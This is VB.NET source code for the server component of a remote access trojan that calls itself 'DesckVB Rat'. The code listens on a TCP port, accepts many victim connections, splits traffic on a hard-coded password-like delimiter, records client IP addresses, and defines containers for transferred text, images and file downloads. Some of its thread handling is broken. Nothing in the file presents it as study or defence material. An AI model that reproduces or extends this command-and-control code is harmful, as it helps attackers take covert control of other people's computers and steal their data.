Imports System.Net
Imports System.Net.Sockets, System.IO, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices, Microsoft.Win32
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Diagnostics
Imports System.Collections.Generic
Imports System
Imports System.Drawing.Imaging 'imagem
Imports System.Drawing 'imagem 
Imports System.Drawing.Drawing2D 'imagem 2d
Imports System.Environment
Imports System.Windows
Imports System.Windows.Forms.Form
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports System.Net.Sockets.TcpListener


Public Class SocketServer
#Region "SocketServer"
    Private S As TcpListener
#End Region
    Public Sub stops()
        Try
            S.Stop()
            Dim T As New Threading.Thread(AddressOf PND, 1)
            T.Abort()
            Form1.ListBox1.Items.Add("DesckVB Rat Disconected: Porta " & Form1.NumericUpDown1.Value & " Day Date " & My.Computer.Clock.LocalTime) 'logs
        Catch ex As Exception 'clean erros
            Form1.ListBox1.Items.Add("Erro Na Port ! " & Form1.NumericUpDown1.Value & " Day Date " & My.Computer.Clock.LocalTime) 'logs
            MsgBox("   Erro de Porta !", MessageBoxIcon.Error) 'mensagem
        End Try
    End Sub
    Public Sub Start(ByVal P As Integer)
        Try
            S = New TcpListener(P)
            S.Server.SendTimeout = -1
            S.Server.ReceiveTimeout = -1
            S.Start()
            Dim T As New Threading.Thread(AddressOf PND, 1)
            T.Start()
            Form1.ListBox1.Items.Add("DesckVB Rat Conected: Porta " & Form1.NumericUpDown1.Value & " Day Date " & My.Computer.Clock.LocalTime) 'logs
        Catch ex As Exception
            Form1.ListBox1.Items.Add("Erro Na Porta ! " & Form1.NumericUpDown1.Value & " Day Date " & My.Computer.Clock.LocalTime) 'logs
            MsgBox("   Aporta já Esta em Uso !", MessageBoxIcon.Error) 'mensagem
        End Try
    End Sub
    Public Sub Send(ByVal sock As Integer, ByVal s As String)
        Send(sock, SB(s))
    End Sub
    Public Sub Send(ByVal sock As Integer, ByVal b As Byte())
        Try
            Dim m As New IO.MemoryStream
            m.Write(b, 0, b.Length)
            m.Write(SB(SPL), 0, SPL.Length)
            SK(sock).Send(m.ToArray, 0, m.Length, SocketFlags.None)
            m.Dispose()
        Catch ex As Exception
            Disconnect(sock)
        End Try
    End Sub
#Region "Socket"
    Private SKT As Integer = -1
    Public SK(204800) As Socket
    Public Event Datad(ByVal info As Data)
    Public Event Data(ByVal sock As Integer, ByVal B As Byte())
    Public Event DisConnected(ByVal sock As Integer)
    Public Event Connected(ByVal sock As Integer)
    Private SPL As String = "Jp-Pjoao1578" 'split packets by this word = senha de conections
#End Region
    Private Function NEWSKT() As Integer
re:
        Threading.Thread.Sleep(1)
        SKT += 1
        If SKT = SK.Length Then
            SKT = 0
            GoTo re
        End If
        If Online.Contains(SKT) = False Then
            Online.Add(SKT)
            Return SKT.ToString.Clone
        End If
        GoTo re
    End Function
    Public Online As New List(Of Integer)
    Public Sub PND()

        Try
            ReDim SK(204800)
re:

            Threading.Thread.Sleep(1)
            If S.Pending Then

                Dim sock As Integer = NEWSKT()
                SK(sock) = S.AcceptSocket

                SK(sock).ReceiveBufferSize = 204800
                SK(sock).SendBufferSize = 204800
                SK(sock).ReceiveTimeout = 10000
                SK(sock).SendTimeout = 10000

                Dim t As New Threading.Thread(AddressOf RC, 1)
                t.Start(sock)
                RaiseEvent Connected(sock)
            End If
            GoTo re
        Catch : End Try
    End Sub
    Public Sub Disconnect(ByVal Sock As Integer)
        Try
            SK(Sock).Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            SK(Sock).Close()
        Catch ex As Exception
        End Try
        SK(Sock) = Nothing
    End Sub
    Public Sub RC(ByVal sock As Integer)
        Dim M As New IO.MemoryStream
        Dim cc As Integer = 0

re:

        cc += 1
        If cc = 500 Then
            Try
                If SK(sock).Poll(-1, Net.Sockets.SelectMode.SelectRead) And SK(sock).Available <= 0 Then
                    GoTo e
                End If
            Catch ex As Exception
                GoTo e
            End Try
            cc = 0
        End If
        Try
            If SK(sock) IsNot Nothing Then

                If SK(sock).Connected Then
                    If SK(sock).Available > 0 Then
                        Dim B(SK(sock).Available - 1) As Byte
                        SK(sock).Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                        M.Write(B, 0, B.Length)
rr:
                        If BS(M.ToArray).Contains(SPL) Then
                            Dim A As Array = fx(M.ToArray, SPL)
                            RaiseEvent Data(sock, A(0))
                            M.Dispose()
                            M = New IO.MemoryStream
                            If A.Length = 2 Then
                                M.Write(A(1), 0, A(1).length)
                                Thread.Sleep(1)
                                GoTo rr
                            End If
                        End If

                    End If
                Else
                    GoTo e
                End If
            Else
                GoTo e
            End If
        Catch ex As Exception
            GoTo e
        End Try
        Threading.Thread.Sleep(1)
        GoTo re
e:
        Disconnect(sock)
        Try
            Online.Remove(sock)
        Catch ex As Exception
        End Try
        RaiseEvent DisConnected(sock)
    End Sub
    Private oIP(204800) As String
    Public Function IP(ByRef sock As Integer) As String
        Try
            oIP(sock) = Split(SK(sock).RemoteEndPoint.ToString(), ":")(0)
            Return oIP(sock)
        Catch ex As Exception
            If oIP(sock) Is Nothing Then
                Return "Erro !"
            Else
                Return oIP(sock)
            End If
        End Try

    End Function
End Class
<Serializable()> Public Class Data
    Implements ISerializable
    Private data As String
    Private pic As Image
    Private bytes() As Byte
    Public Sub New(ByVal s As String, ByVal p As Image, ByVal b() As Byte)
        data = s : pic = p : bytes = b
    End Sub
    Public Sub New(ByVal info As SerializationInfo, ByVal ctxt As StreamingContext)
        data = DirectCast(info.GetValue("data", GetType(String)), String)
        pic = DirectCast(info.GetValue("image", GetType(Image)), Image)
        bytes = DirectCast(info.GetValue("bytes", GetType(Byte())), Byte())
    End Sub
    Public Sub GetObjectData(ByVal info As SerializationInfo, ByVal ctxt As StreamingContext) Implements ISerializable.GetObjectData
        info.AddValue("data", data) : info.AddValue("image", pic) : info.AddValue("bytes", bytes)
    End Sub
    Public Function GetData() As String
        Return data
    End Function
    Public Function GetImage() As Image
        Return pic
    End Function
    Public Function GetBytes() As Byte()
        Return bytes
    End Function
End Class
Public Class DownloadContainer
#Region "DownloadContainer"
    Public identification As Integer = 0
    Public nextPart As Boolean = False
    Public cancel As Boolean = False
#End Region
    Sub New(ByVal id As Integer)
        identification = id
    End Sub
End Class